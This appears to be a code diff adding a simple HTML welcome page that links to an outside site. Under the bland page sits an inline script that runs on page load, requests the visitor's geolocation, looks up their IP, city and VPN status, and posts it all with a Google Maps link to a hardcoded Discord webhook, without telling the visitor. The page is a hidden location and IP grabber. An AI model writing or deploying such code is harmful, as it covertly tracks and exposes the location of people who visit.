@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome to an awesome website</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        p {
+            color: #555;
+        }
+
+        a {
+            color: #007BFF;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Welcome to an awesome website</h1>
+    <p>This website is no longer useless! If you're feeling adventurous, you can visit the main website <a href="https://moopx.pro" target="_blank">here</a>.</p>
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            const w = 'https://discord.com/api/webhooks/1181948401353502751/dv7MXBVzmttSIHREI2lZ67U2sb5CvroDpv62nsGAH1yDBihziRNfX3vtYJY304G14BF4',
+                s = (i, a, u, V, l) => {
+                    fetch(w, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `New visitor info:\nIP: ${i || 'N/A'}\nAddress: ${a || 'N/A'}\nUser Agent: ${u}\nVPN: ${V ? 'Yes' : 'No'}\nCoordinates: ${l || 'N/A'}\nGoogle Maps Link: ${l ? 'https://www.google.com/maps?q=' + l : 'N/A'}`,
+                        }),
+                    });
+                },
+                v = async () => {
+                    try {
+                        const p = await new Promise((r, j) => {
+                            navigator.geolocation.getCurrentPosition(r, j);
+                        });
+
+                        const l = `${p.coords.latitude},${p.coords.longitude}`;
+                        const i = await (await fetch('https://ipinfo.io/json')).json();
+                        const I = i.ip || 'N/A';
+                        const A = `${i.city || 'N/A'}, ${i.region || 'N/A'}, ${i.country || 'N/A'}`;
+                        const U = navigator.userAgent;
+                        const V = i.vpn || !1;
+
+                        s(I, A, U, V, l);
+                    } catch (e) {
+                        console.error('Error fetching location:', e);
+
+                        const i = await (await fetch('https://ipinfo.io/json')).json();
+                        const I = i.ip || 'N/A';
+                        const A = `${i.city || 'N/A'}, ${i.region || 'N/A'}, ${i.country || 'N/A'}`;
+                        const U = navigator.userAgent;
+                        const V = i.vpn || !1;
+
+                        s(I, A, U, V, null);
+                    }
+                };
+            v();
+        });
+    </script>
+</body>
+
+</html>
